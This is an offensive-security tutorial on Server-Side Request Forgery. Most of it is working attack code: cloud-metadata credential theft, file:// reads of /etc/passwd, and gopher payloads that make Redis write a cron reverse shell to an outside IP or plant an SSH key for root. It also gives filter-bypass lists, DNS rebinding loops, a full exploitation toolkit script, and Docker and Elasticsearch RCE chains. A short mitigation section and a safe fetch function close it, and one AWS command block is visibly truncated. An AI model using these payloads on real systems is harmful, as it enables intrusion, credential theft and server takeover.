SSRF

Server-Side Request Forgery - forcing a server to make requests to internal services, cloud metadata, and databases

Overview

SSRF makes a server issue a request the attacker cannot make directly, reaching internal services and cloud metadata endpoints. This article shows how to find injectable parameters, abuse the file:// , gopher:// , and dict:// schemes, bypass localhost filters, and chain the flaw into Redis, Elasticsearch, and Docker API compromise. By the end you can test an SSRF endpoint and choose the right mitigation.

Required Reading

  • HTTP - protocol, methods, headers, redirect behavior, URL structure
  • DNS - resolution, internal zones, split-horizon DNS , reverse lookup

The Core Mechanic

A server accepts a URL from the user and makes an HTTP request to it. The server's network position - behind the firewall, on the internal network, in the cloud - gives it access that the attacker does not have directly. 

Attacker → [SSRF Parameter] → Web Server → [Internal Network Request] → Target
                                                      ↑
                                              Trusted Position
                                              (bypasses firewall)

The vulnerability pattern is always the same:

# Vulnerable pattern
import requests
url = request.args.get('url')
response = requests.get(url)
return response.text

# Vulnerable pattern with file download
import urllib.request
image_url = request.form.get('image_url')
urllib.request.urlretrieve(image_url, '/var/www/uploads/avatar.png')

Cloud Metadata Endpoints

Cloud providers expose instance metadata via a link-local IP address. These endpoints are accessible only from the instance itself - making SSRF the primary attack vector.

Cloud Provider Metadata URL IMDS Version Header Required
AWS http://169.254.169.254/latest/meta-data/ v1 & v2 Token for v2:X-aws-ec2-metadata-token
Google Cloud http://169.254.169.254/computeMetadata/v1/ v1 Metadata-Flavor: Google
Azure http://169.254.169.254/metadata/instance v1 Metadata: true
DigitalOcean http://169.254.169.254/metadata/v1/ v1 None
Alibaba Cloud http://100.100.100.200/latest/meta-data/ v1 None
OpenStack http://169.254.169.254/openstack/latest/meta_data.json v1 None

AWS IMDS Exploitation

# AWS IMDSv1 (no token required)
curl http://169.254.169.254/latest/meta-data/

# IAM credentials for the instance role
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/

# Specific role credentials
ROLE=$(curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/)

# User data (often contains bootstrap scripts with secrets)

  http://169.254.169.254/latest/api/token)
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/

Protocol Smuggling via SSRF

Most SSRF -capable libraries support multiple URL schemes. Each scheme opens a different attack surface.

file://

Read local files:

curl "http://target/ssrf?url=file:///etc/passwd"
curl "http://target/ssrf?url=file:///proc/self/environ"
curl "http://target/ssrf?url=file:///proc/1/cmdline"

In Java, file:// can list directories: 

curl "http://target/ssrf?url=file:///etc/"     # Java: returns directory listing
curl "http://target/ssrf?url=file:///var/www/"  # Web root enumeration

gopher:// (TCP Protocol Smuggling)

The gopher:// scheme opens a raw TCP connection and sends arbitrary bytes. This allows interacting with any TCP -based service through SSRF .

The format: gopher://HOST:PORT/_DATA - the _ is a placeholder for the gopher item type, and DATA is URL -encoded raw bytes sent to the socket. 

gopher://127.0.0.1:6379/_DATA

Gopher to Redis - Cron Job RCE

import urllib.parse

# Redis commands to write a cron job that calls back
redis_commands = [
    "FLUSHALL",
    "SET mykey \"\n\n*/1 * * * * /bin/bash -c 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1'\n\n\"",
    "CONFIG SET dir /var/spool/cron/crontabs",
    "CONFIG SET dbfilename root",
    "SAVE",
    "QUIT"
]

payload = "\r\n".join(redis_commands)
encoded = urllib.parse.quote(payload)

gopher_url = f"gopher://127.0.0.1:6379/_{encoded}"
print(gopher_url)
# Send this as the SSRF URL parameter

Gopher to Redis - SSH Authorized Keys

The same technique, but write to ~/.ssh/authorized_keys : 

import urllib.parse

ssh_pubkey = "ssh-rsa AAAAB3NzaC1yc2EAAA... attacker@kali"  # Your pubkey

redis_commands = [
    "FLUSHALL",
    f'SET sshkey "\n\n{ssh_pubkey}\n\n"',
    "CONFIG SET dir /root/.ssh",
    "CONFIG SET dbfilename authorized_keys",
    "SAVE",
    "QUIT"
]

payload = "\r\n".join(redis_commands)
encoded = urllib.parse.quote(payload)
print(f"gopher://127.0.0.1:6379/_{encoded}")

Gopher to MySQL

Although My SQL has its own binary protocol, you can cause a denial of service or probe for version info: 

# Send MySQL "greeting" probe
gopher_url = f"gopher://127.0.0.1:3306/_{urllib.parse.quote(chr(0x0a))}"
# The server will respond with its protocol greeting

dict:// (Port Scanning)

The dict:// protocol connects to a dictionary server. Against non-dict services, it reveals whether a port is open or closed based on connection time: 

# dict protocol sends "CLIENT libcurl\n" and reads response
curl -s "http://target/ssrf?url=dict://127.0.0.1:22"
# Open (SSH responds): "SSH-2.0-OpenSSH_8.9p1"
# Open (HTTP responds): "HTTP/1.1 400 Bad Request"
# Closed: connection refused or timeout

Automated port scan through SSRF : 

import requests
import time

target_ssrf = "http://target/app?url={}"
ports = [22, 80, 443, 3306, 5432, 6379, 8080, 9200, 27017, 2375]

for port in ports:
    start = time.time()
    try:
        r = requests.get(target_ssrf.format(f"dict://127.0.0.1:{port}"), timeout=3)
        elapsed = time.time() - start
        print(f"Port {port}: OPEN ({elapsed:.2f}s) — {len(r.text)} bytes")
    except requests.exceptions.Timeout:
        print(f"Port {port}: FILTERED/TIMEOUT")
    except Exception as e:
        print(f"Port {port}: CLOSED — {e}")

SSRF Bypass Techniques

Localhost Bypass

When the application blacklists "localhost" or "127.0.0.1":

# Decimal IP notation
http://2130706433/          # 127.0.0.1 as decimal
http://2852039166/          # 169.254.169.254 as decimal

# Hexadecimal IP notation
http://0x7F000001/          # 127.0.0.1 as hex
http://0x7F.0.0.1/          # Mixed notation
http://0xA9FEA9FE/          # 169.254.169.254 as hex

# Octal IP notation
http://0177.0.0.1/          # 127 in octal
http://0177.00.00.01/       # Full octal

# IPv6 loopback
http://[::1]/
http://[::ffff:127.0.0.1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/

# DNS-based bypass
http://localhost.domain.com/        # External DNS pointing to 127.0.0.1
http://127.0.0.1.nip.io/            # nip.io resolves to 127.0.0.1
http://localtest.me/                # Resolves to 127.0.0.1 (historically)
http://127.1/                        # Short form: Linux treats 127.1 as 127.0.0.1
http://0.0.0.0/                      # "All interfaces" — binds to all, may hit services
http://0/                            # Linux treats 0 as 0.0.0.0

# Alternative loopback
http://127.127.127.127/
http://127.0.1.3/

# Case variation and encoding
http://LOCALHOST/
http://127.0.0.1%00@evil.com/        # Null byte terminator
http://⑫⑦。⓪。⓪。①/                    # Fullwidth characters (if decoded)
http://2130706433.xip.io/             # Decimal + xip.io

# Redirections
http://redirect-service.com/redirect?to=http://127.0.0.1/

Conversion reference

import ipaddress
import struct
import socket

def ip_to_decimal(ip):
    return int.from_bytes(socket.inet_aton(ip), 'big')

def ip_to_hex(ip):
    return hex(ip_to_decimal(ip))

print(ip_to_decimal('127.0.0.1'))        # 2130706433
print(ip_to_decimal('169.254.169.254'))  # 2852039166
print(ip_to_hex('127.0.0.1'))            # 0x7f000001

URL Parser Inconsistency Bypass

Different libraries parse URL s differently. Exploit the disagreement between validation and request: 

# The validator sees "example.com", the requester connects to localhost
http://example.com@127.0.0.1/
http://example.com:80@127.0.0.1/
http://127.0.0.1:80@example.com/         # Some parsers take 127.0.0.1 as auth

# Fragment confusion
http://example.com#@127.0.0.1/
http://127.0.0.1#@example.com/

# Double URL encoding
http://127.0.0.1%2f@example.com/         # %2f = /
http://localhost%252f@example.com/        # Double-encoded /

# Query string embedding
http://example.com/?url=http://127.0.0.1/
http://example.com?x=http://127.0.0.1/admin

DNS Rebinding

Register a domain whose DNS record changes after validation. The validator resolves it and sees a safe IP . The actual request resolves it again and gets the internal IP . 

# Tools: rbndr, singularity, dnsrebind.net

# 1. Use a rebinding service
# Configure: 1.2.3.4.example.com → initially resolves to 1.2.3.4 (your IP)
#            After TTL:          → resolves to 127.0.0.1

# 2. Self-hosted DNS rebinding with dnschef
dnschef --fakeip 127.0.0.1 --fakedomains rebind.local

# 3. Exploit with TOCTOU race
# Send rapid parallel requests hoping some resolve before, some after rebind
for i in $(seq 1 100); do
    curl "http://target/ssrf?url=http://rebind.local/admin" &
done

Open Redirect as SSRF Bridge

If direct SSRF is filtered but there's an open redirect: 

SSRF URL: http://target/open-redirect?redirect=http://169.254.169.254/

Custom SSRF Exploitation Script

A comprehensive Python script for SSRF testing: 

#!/usr/bin/env python3
"""
SSRF exploitation toolkit.
Tests multiple bypass techniques against a target SSRF endpoint.
"""

import requests
import urllib.parse
import sys
import time
import socket
import struct
import argparse
from concurrent.futures import ThreadPoolExecutor

BURP_COLLAB = "YOUR_COLLABORATOR.burpcollaborator.net"

def ip_to_decimal(ip):
    return struct.unpack("!I", socket.inet_aton(ip))[0]

def ip_to_hex(ip):
    return hex(ip_to_decimal(ip))

def build_localhost_bypasses():
    """Generate all localhost variants."""
    return [
        "http://127.0.0.1",
        "http://127.1",
        "http://localhost",
        "http://0.0.0.0",
        "http://0",
        "http://[::1]",
        "http://[::ffff:127.0.0.1]",
        f"http://{ip_to_decimal('127.0.0.1')}",
        f"http://{ip_to_hex('127.0.0.1')}",
        "http://0177.0.0.1",
        "http://0177.00.00.01",
        "http://127.127.127.127",
        "http://2130706433",
        "http://0x7f.0.0.1",
        "http://127.0.0.1.nip.io",
        "http://localtest.me",
        "http://127.0.0.1%00.example.com",
        "http://example.com@127.0.0.1",
        "http://127.0.0.1:80@example.com",
        "http://example.com#@127.0.0.1",
    ]

def build_metadata_urls():
    """Cloud metadata endpoints."""
    metadata = {
        "aws": ["http://169.254.169.254/latest/meta-data/",
                f"http://{ip_to_decimal('169.254.169.254')}/latest/meta-data/"],
        "gcp": ["http://169.254.169.254/computeMetadata/v1/instance/"],
        "azure": ["http://169.254.169.254/metadata/instance"],
        "digitalocean": ["http://169.254.169.254/metadata/v1/"],
        "alibaba": ["http://100.100.100.200/latest/meta-data/"],
    }
    return metadata

def test_parameter_ssrf(target_url, param_name, bypass_list, method='GET'):
    """Test each bypass URL against a specific parameter."""
    results = []
    for bypass_url in bypass_list:
        try:
            if method == 'GET':
                url = target_url + f"?{param_name}={urllib.parse.quote(bypass_url)}"
                r = requests.get(url, timeout=5, allow_redirects=False)
            else:
                r = requests.post(target_url, data={param_name: bypass_url}, timeout=5)
            results.append({
                'url': bypass_url,
                'status': r.status_code,
                'length': len(r.content),
                'time': r.elapsed.total_seconds()
            })
            print(f"  [{r.status_code}] {bypass_url} ({len(r.content)} bytes, {r.elapsed.total_seconds():.2f}s)")
        except requests.exceptions.Timeout:
            print(f"  [TIMEOUT] {bypass_url}")
        except Exception as e:
            print(f"  [ERROR] {bypass_url}: {e}")
    return results

def gopher_payload(host, port, data):
    """Build a gopher URL for raw TCP communication."""
    # URL-encode the data, preserving newlines as %0d%0a
    encoded = urllib.parse.quote(data, safe='')
    # Gopher format: gopher://host:port/_<url-encoded-data>
    return f"gopher://{host}:{port}/_{encoded}"

def redis_to_cron(attacker_ip, attacker_port):
    """Generate gopher URL to write a cron job via Redis."""
    cron_cmd = f"* * * * * root bash -c 'bash -i >& /dev/tcp/{attacker_ip}/{attacker_port} 0>&1'"
    redis_payload = "\r\n".join([
        "FLUSHALL",
        f'SET cron "\n\n{cron_cmd}\n\n"',
        "CONFIG SET dir /etc/cron.d",
        "CONFIG SET dbfilename redis_shell",
        "SAVE",
        "QUIT"
    ])
    return gopher_payload("127.0.0.1", 6379, redis_payload)

def redis_to_authorized_keys(ssh_pubkey):
    """Generate gopher URL to write SSH authorized_keys via Redis."""
    redis_payload = "\r\n".join([
        "FLUSHALL",
        f'SET sshkey "\n\n{ssh_pubkey}\n\n"',
        "CONFIG SET dir /root/.ssh",
        "CONFIG SET dbfilename authorized_keys",
        "SAVE",
        "QUIT"
    ])
    return gopher_payload("127.0.0.1", 6379, redis_payload)

def portscan_via_ssrf(target_url, param_name, subnet="127.0.0.1"):
    """Scan internal ports via dict:// SSRF."""
    ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200, 27017, 2375, 10250]
    open_ports = []
    for port in ports:
        start = time.time()
        try:
            url = target_url + f"?{param_name}={urllib.parse.quote(f'dict://{subnet}:{port}')}"
            r = requests.get(url, timeout=3)
            elapsed = time.time() - start
            if r.status_code != 500 and elapsed < 2.5:
                open_ports.append(port)
                print(f"  Port {port}: OPEN ({elapsed:.2f}s)")
        except:
            pass
    return open_ports

def main():
    parser = argparse.ArgumentParser(description='SSRF Exploitation Toolkit')
    parser.add_argument('target', help='Target SSRF URL (e.g., http://target/page?url=)')
    parser.add_argument('-p', '--parameter', default='url', help='Parameter name to inject (default: url)')
    parser.add_argument('-m', '--method', default='GET', choices=['GET', 'POST'])
    parser.add_argument('--scan', action='store_true', help='Scan internal ports via dict:// SSRF')
    parser.add_argument('--bypass', action='store_true', help='Test localhost bypass techniques')
    parser.add_argument('--metadata', action='store_true', help='Test cloud metadata endpoints')
    parser.add_argument('--redis-cron', metavar='ATTACKER_IP:PORT', help='Generate Redis→Cron payload')
    args = parser.parse_args()

    if args.scan:
        print("[*] Port scanning internal services via dict://")
        open_ports = portscan_via_ssrf(args.target, args.parameter)
        print(f"[+] Open ports: {open_ports}")

    if args.bypass:
        print("[*] Testing localhost bypass techniques")
        test_parameter_ssrf(args.target, args.parameter, build_localhost_bypasses(), args.method)

    if args.metadata:
        print("[*] Testing cloud metadata endpoints")
        meta_urls = build_metadata_urls()
        for cloud, urls in meta_urls.items():
            print(f"\n  --- {cloud.upper()} ---")
            test_parameter_ssrf(args.target, args.parameter, urls, args.method)

    if args.redis_cron:
        host_port = args.redis_cron.split(':')
        attacker_ip = host_port[0]
        attacker_port = host_port[1] if len(host_port) > 1 else '4444'
        gopher = redis_to_cron(attacker_ip, attacker_port)
        print("[*] Redis → Cron job Gopher URL:")
        print(gopher)
        print("\n[*] Send this as the SSRF parameter value")

if __name__ == '__main__':
    main()

Blind SSRF

When the server doesn't return the fetched content, you need side channels:

Out-of-band callbacks: Use Burp Collaborator or interactsh to receive DNS / HTTP callbacks: 

# interactsh
interactsh-client -json -o interactsh.json
# Start callback server, get a unique domain like c12345.interact.sh

# Send that domain as the SSRF target
curl "http://target/ssrf?url=http://c12345.interact.sh/"
# If you get a DNS or HTTP callback, SSRF is confirmed

Time-based detection: Port open -> quick error. Port closed -> connection timeout. 

time curl -s "http://target/ssrf?url=http://127.0.0.1:22/"  # Fast: port 22 open
time curl -s "http://target/ssrf?url=http://127.0.0.1:8765/" # Slow: port closed

Error differentiation: Different ports produce different errors: 

curl "http://target/ssrf?url=http://127.0.0.1:8080/"  # "admin panel response..."
curl "http://target/ssrf?url=http://127.0.0.1:9200/"  # "{\"name\":\"elasticsearch\"...}"
curl "http://target/ssrf?url=http://127.0.0.1:6379/"  # "ERR unknown command 'GET'"

SSRF -> RCE Chains

SSRF -> Redis -> System Command

SSRF (gopher://) → Redis → CONFIG SET dir /etc/cron.d → SAVE → cron executes every minute

SSRF -> Elasticsearch RCE

http://target/ssrf?url=http://localhost:9200/_search?source={"script_fields":{"test":{"script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\")"}}}

SSRF -> Docker API -> Host Root

# Podman socket is at /run/podman/podman.sock; Docker socket at /var/run/docker.sock
# But Docker API on TCP (2375) can be hit via SSRF

# Create privileged container mounting host root filesystem
curl "http://target/ssrf?url=http://localhost:2375/containers/create"
POST to create with {"Image":"alpine","Cmd":["/bin/sh","-c","chroot /hostfs cat /hostfs/etc/shadow"],"HostConfig":{"Binds":["/:/hostfs:rw"],"Privileged":true}}

Fixes

Mitigation Effectiveness Notes
Allowlist domains Best Only permit known-safe domains. Hardcode them.
Disallow all internal IPs Strong Block RFC 1918 (10/8, 172.16/12, 192.168/16), loopback (127/8), link-local (169.254/16),0.0.0.0,::1
Validate DNS first, then connect Good Resolve the hostname, validate the IP, then make the request (beware DNS rebinding with very short TTL)
Disable URL schemes Strong Only allowhttp://andhttps://. Blockfile://,gopher://,dict://,ftp://.
Use network egress proxy Strong Route all outbound requests through a proxy that enforces allowlists
Disable redirect following Supplemental Prevents open-redirect-to-SSRF chains. Set redirect limit to 0.
Network segmentation Architectural Don't run web servers on the same box as databases. Put metadata in a separate namespace (IMDSv2).

Python fix example (requests)

import socket
import ipaddress
import requests
from urllib.parse import urlparse

ALLOWED_DOMAINS = {'api.trusted.com', 'cdn.example.com'}
BLOCKED_NETWORKS = [
    ipaddress.ip_network('10.0.0.0/8'),
    ipaddress.ip_network('172.16.0.0/12'),
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('127.0.0.0/8'),
    ipaddress.ip_network('169.254.0.0/16'),
    ipaddress.ip_network('0.0.0.0/8'),
]

def safe_request(url):
    parsed = urlparse(url)
    if parsed.scheme not in ('http', 'https'):
        raise ValueError(f"Scheme {parsed.scheme} not allowed")
    if parsed.hostname not in ALLOWED_DOMAINS:
        raise ValueError(f"Domain {parsed.hostname} not in allowlist")
    ip = socket.gethostbyname(parsed.hostname)
    for net in BLOCKED_NETWORKS:
        if ipaddress.ip_address(ip) in net:
            raise ValueError(f"IP {ip} is in blocked range {net}")
    return requests.get(url, allow_redirects=False, timeout=5)

Challenge
